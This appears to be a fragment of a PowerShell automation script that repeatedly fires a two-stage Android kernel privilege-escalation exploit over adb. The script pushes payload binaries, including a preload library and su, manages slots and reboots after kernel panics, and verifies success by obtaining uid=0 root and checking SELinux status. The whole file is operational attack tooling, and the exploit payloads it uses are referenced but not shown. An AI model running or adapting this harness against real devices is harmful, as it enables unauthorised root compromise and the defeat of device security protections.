    $blAbs = Join-Path $RepoRoot $script:BL
    [void](Start-BashCommandFile -CommandFile $cmdPath -RedirectFile $script:BL)

    $waited = 0
    while ($waited -lt $script:BVerdictTimeout) {
        Start-Sleep -Seconds 5
        $waited += 5
        if ((Get-ByteCount $blAbs) -gt 0) {
            $d = Read-RawText $blAbs
            $hit = $false
            foreach ($m in $B_POLL_MARKS) { if ($d.Contains($m)) { $hit = $true; break } }
            if ($hit) { break }
        }
        if (-not (Test-Online) -and $waited -ge 20) { break }
    }

    Write-Log "  B verdict poll after ${waited}s -> $(Get-LineCount $blAbs) log lines"
    $script:BVerdict = Get-BVerdict $blAbs
    Write-Log "B verdict slot=$Slot => $($script:BVerdict)"
    return 0
}

function Test-VerifiedRoot {
    $r = Invoke-Adb -AdbArgs @('shell', "$DL/su -c 'id; getenforce'") -TimeoutSec 25 -MergeStderr
    $flat = ($r.Text -split "`n" | ForEach-Object { $_.Trim() }) -join ' '
    Write-Log "ROOT-VERIFY: $flat"
    if ($r.Text.Contains('uid=0(root)')) {
        Invoke-NormalizeAsRoot
        return $true
    }
    return $false
}

function Invoke-BandProbe {
    $r = Invoke-Adb -AdbArgs @('shell', "[ -x $DL/bandscan ]; echo `$?") -TimeoutSec 15
    if ($r.Text.Trim() -ne '0') {
        Write-Log '  bandscan not on device'
        return 1
    }
    $outName = 'band_post.txt'
    $r = Invoke-Adb -AdbArgs @('shell', "$DL/su -c '$DL/bandscan 1024'") -TimeoutSec 60 -MergeStderr
    $r.Text = $r.Text -replace "`r", ''
    Write-Utf8NoBom -Path (Join-Path $RepoRoot $outName) -Text $r.Text
    $lines = $r.Text -split "`n"
    $indexes = @(0, 1, 2) + (13..17)
    foreach ($i in $indexes) {
        if ($i -lt $lines.Count) { [Console]::Out.WriteLine($lines[$i]) }
    }
    return 0
}

Write-Log "================ autofire start (max_cycles=$MaxCycles) ================"
Write-Log ("gate: FIRE<=${UPTIME_FIRE_MAX}s REBOOT_AT=${UPTIME_REBOOT_AT}s LOAD<=${LOAD_MAX_LATE} " +
    "(uptime<${LOAD_EARLY_UNTIL}s: <=${LOAD_MAX_EARLY}) | reboots<=$($script:MaxReboots) | B retries=$B_RETRIES")

$env:ADB = ($script:AdbParts -join ' ')
$env:KALLSYMS = $script:Kallsyms

foreach ($f in @('scripts/a_command.txt', 'scripts/b_command.txt', 'ksu/make_device_ko.py')) {
    if (-not (Test-Path -LiteralPath (Join-Path $RepoRoot $f))) {
        Stop-Fatal "missing host input $f"
    }
}
if (-not (Test-Path -LiteralPath $script:Kallsyms)) {
    Stop-Fatal "missing kallsyms: $($script:Kallsyms) (set KALLSYMS=C:\path\to\kallsyms.new)"
}

Invoke-BuildArtifacts

if (-not (Test-Path -LiteralPath (Resolve-RepoPath $Psl2Src))) {
    Stop-Fatal "missing $Psl2Src -- 构建未产出该文件，查看 $($script:BuildLog)"
}
if (-not (Test-Path -LiteralPath (Resolve-RepoPath $PreloadSrc))) {
    Stop-Fatal "missing $PreloadSrc -- 构建未产出该文件，查看 $($script:BuildLog)"
}

$manifestPath = Resolve-RepoPath $script:Manifest
Write-Utf8NoBom -Path $manifestPath -Text ''
Add-ManifestEntry 'preload.so' $PreloadSrc 0
Add-ManifestEntry 'psl2' $Psl2Src 1
Add-ManifestEntry 'su' $script:SuBin 1
Add-ManifestEntry (Split-Path -Leaf $script:BandscanSrc) $script:BandscanSrc 1
$entryCount = @(Get-ManifestEntries).Count
Write-Log "transfer manifest -> $($script:Manifest) ($entryCount entries)"

if (-not (Invoke-SyncManifest)) { Stop-Fatal '传输清单自检失败' }

[void](Invoke-Adb -AdbArgs @('shell', 'sync') -TimeoutSec 25)
Write-Log 'payload preflight OK'

if ($script:SyncOnly) {
    Write-Log '================ sync-only 完成（未发射） ================'
    exit 0
}

if ($script:NormalizeOnly) {
    Invoke-NormalizeAsRoot
    Write-Log '================ normalize-only 完成 ================'
    exit 0
}

if (-not (Test-Online)) { Write-Log 'device offline at start' }
if (Read-State) { Write-Log "PRE uptime=$($script:Up)s enforce=$($script:Enf) boot_id=$(Boot-IdShort $script:Bid)" }
$script:OldBid = if ($script:Bid) { $script:Bid } else { 'none' }

$script:Cycle = 0
$script:Win = 0

while ($script:Cycle -lt $MaxCycles) {
    $script:Cycle++
    Write-Log "----------------------- CYCLE $($script:Cycle)/$MaxCycles (reboots $($script:Reboots)/$($script:MaxReboots)) -----------------------"

    if (-not (Test-Online)) {
        Write-Log 'device offline -> waiting for it to come back'
        if (-not (Wait-NewBoot)) { Stop-Fatal 'device never returned' }
    }
    if (-not (Read-State)) { Stop-Fatal 'cannot read state' }
    if (-not $script:OldBid) { $script:OldBid = $script:Bid }

    $gt = 0
    while ($true) {
        $script:GateRc = Invoke-Gate
        if ($script:GateRc -eq 0) { break }
        if ($script:GateRc -ne 1) { break }
        $gt++
        if ($gt -gt $GATE_MAX_TRIES) {
            Write-Log "  load never settled after $GATE_MAX_TRIES checks"
            break
        }
        Write-Log "  gate load transient -> bounded retry $gt/$GATE_MAX_TRIES"
        Start-Sleep -Seconds 12
    }
    if ($script:GateRc -eq 2) {
        if (-not (Invoke-RebootOnce)) {
            Write-Log 'gate unsatisfiable and cannot reboot -> STOP'
            break
        }
        $script:Cycle--
        continue
    }
    if ($script:GateRc -eq 1) {
        Write-Log "  GATE-ADVISORY load1=$($script:L1) still > cap after $GATE_MAX_TRIES retries -> firing anyway"
        Write-Log '  (loadavg is a startup-storm indicator, not a B predictor; a past round rooted at load1=17.00)'
    }

    $aWin = 0
    $aSlot = ''
    $aDead = 0
    foreach ($slot in $A_SLOT_LIST) {
        Invoke-FireA $slot
        $aSlot = $slot
        if ($script:AVerdict -eq 'WIN') { $aWin = 1; break }
        if ($script:AVerdict -eq 'PANIC') {
            Write-Log '  [P-rule] A kill-race family panic -- a known ~20% failure mode of A, not a script bug'
            Write-Log "  boot_reason: $(Get-BootReason)"
            Capture-Ramoops (Get-Date).ToString('HHmmss')
            $aDead = 1
            break
        }
        Write-Log '  A MISS -> fresh-slot resample (same slot forbidden)'
    }

    if ($aDead -eq 1) {
        if ($script:Reboots -ge $script:MaxReboots) {
            Write-Log "  reboot budget exhausted ($($script:Reboots)/$($script:MaxReboots)) -> STOP (no spin)"
            break
        }
        $script:Reboots++
        Write-Log "  device self-rebooted from the panic -> new boot $($script:Reboots)/$($script:MaxReboots)"
        if (-not (Wait-NewBoot)) {
            Write-Log '  did not come back -> STOP'
            break
        }
        [void](Read-State)
        $script:OldBid = $script:Bid
        $script:Cycle--
        continue
    }

    if ($aWin -ne 1) {
        Write-Log 'A phase: no WIN on any fresh slot this boot'
        if (-not (Invoke-RebootOnce)) {
            Write-Log '  cannot get a fresh boot -> STOP'
            break
        }
        $script:Cycle--
        continue
    }

    if (Read-State) { Write-Log "A WIN slot=$aSlot at uptime=$($script:Up)s load1=$($script:L1)" }
    $ge = Invoke-Adb -AdbArgs @('shell', 'getenforce') -TimeoutSec 15 -MergeStderr
    Write-Log ('  getenforce: ' + $ge.Text.Trim())

    $bSlot = [int]$aSlot + 1
    if ($bSlot -gt 3) {
        Write-Log "no fresh slot left for B (A consumed $aSlot) -> next boot"
        if (-not (Invoke-RebootOnce)) {
            Write-Log '  cannot get a fresh boot -> STOP'
            break
        }
        $script:Cycle--
        continue
    }
    Write-Log "B will use fresh slot=$bSlot"

    $tailRc = Invoke-TailPsl2
    if ($tailRc -ne 0) {
        Write-Log "  tail failed rc=$tailRc -> treat as lost window, next boot"
        if (-not (Invoke-RebootOnce)) {
            Write-Log '  cannot get a fresh boot -> STOP'
            break
        }
        $script:Cycle--
        continue
    }

    $tries = 0
    $bPanic = 0
    $bDirty = 0
    $bDead = 0
    while ($tries -le $B_RETRIES) {
        $tries++
        if (Read-State) { Write-Log "  pre-B uptime=$($script:Up)s load1=$($script:L1)" }
        [void](Invoke-FireB -Slot ([string]$bSlot) -Try ([string]$tries))
        Invoke-PanicCheck (Join-Path $RepoRoot $script:BL)

        if ($script:Panic -eq 1) {
            Write-Log '  B panic -> device self-reboots'
            $bPanic = 1
            if ($script:Reboots -ge $script:MaxReboots) {
                Write-Log "  reboot budget exhausted ($($script:Reboots)/$($script:MaxReboots)) -> STOP (no spin)"
            } else {
                $script:Reboots++
                Write-Log "  panic-induced new boot $($script:Reboots)/$($script:MaxReboots); waiting"
                if (-not (Wait-NewBoot)) { Write-Log '  did not come back' }
                [void](Read-State)
                $script:OldBid = $script:Bid
            }
            break
        }

        $blAbs = Join-Path $RepoRoot $script:BL
        $blLines = Get-LineCount $blAbs
        if ($script:BVerdict -eq 'NONE' -and $blLines -le 2) {
            $bDead = 1
            Write-Log "  B log is $blLines line(s) with no verdict -> device died mid-fire"
            break
        }

        if ($script:BVerdict -eq 'ROOT' -or $script:BVerdict -eq 'CHAIN') {
            if (Test-VerifiedRoot) {
                $script:Win = 1
                Write-Log "*** B WIN: root achieved (A slot=$aSlot, B slot=$bSlot, try=$tries) ***"
            } else {
                Write-Log "  chain markers present but 'su -c id' failed -> not claiming WIN"
            }
            break
        }
        if ($script:BVerdict -eq 'PASS') {
            $bDirty = 1
            if (-not (Test-Online)) {
                Write-Log '  PASS + device gone => PANIC #78 arm-stage crash (rb_insert_color graft)'
                $bPanic = 1
                $script:RamoopsDone = 0
                Invoke-PanicCheck $blAbs
            } else {
                Write-Log "  PASS = walk armed, slot $bSlot DIRTY -> refire forbidden, need a new boot"
            }
            break
        }
        switch ($script:BVerdict) {
            'REJECT' { Write-Log '  L-gate rejected all draws (walk never fired, slot unconsumed) -> same-slot resample' }
            'MISS' { Write-Log '  walk MISS (slot unconsumed) -> same-slot resample' }
            default { Write-Log "  unexpected B outcome ($($script:BVerdict)) -> same-slot resample" }
        }
        Start-Sleep -Seconds 3
    }

    if ($script:Win -ne 1 -and ($bDirty -eq 1 -or $bDead -eq 1 -or $bPanic -eq 1)) {
        if ($bPanic -eq 1) {
            $script:Cycle--
            if ($script:Reboots -ge $script:MaxReboots) {
                Write-Log '  reboot budget exhausted -> STOP'
                break
            }
            continue
        }
        Write-Log '  boot is spent (dirty slot / device death) -> fresh boot needed'
        if (-not (Invoke-RebootOnce)) {
            Write-Log 'cannot reach a fresh boot -> STOP'
            break
        }
        $script:Cycle--
        continue
    }

    if ($script:Win -eq 1) {
        if (Read-State) {
            $uname = (Invoke-Adb -AdbArgs @('shell', 'uname -r') -TimeoutSec 15).Text.Trim()
            Write-Log "WIN state: uptime=$($script:Up)s enforce=$($script:Enf) uname=$uname"
        }
        Write-Log 'band state AFTER A+B (closes the [P1] model loop, root available now):'
        [void](Invoke-BandProbe)
        break
    }

    if ($script:Cycle -lt $MaxCycles) {
        if (-not (Invoke-RebootOnce)) {
            Write-Log 'cannot reach a fresh boot -> STOP'
            break
        }
    }
}

Write-Log "================ autofire done: WIN=$($script:Win) cycles=$($script:Cycle) reboots=$($script:Reboots) ================"
if (Read-State) { Write-Log "FINAL uptime=$($script:Up)s enforce=$($script:Enf) boot_id=$(Boot-IdShort $script:Bid)" }
exit (1 - $script:Win)
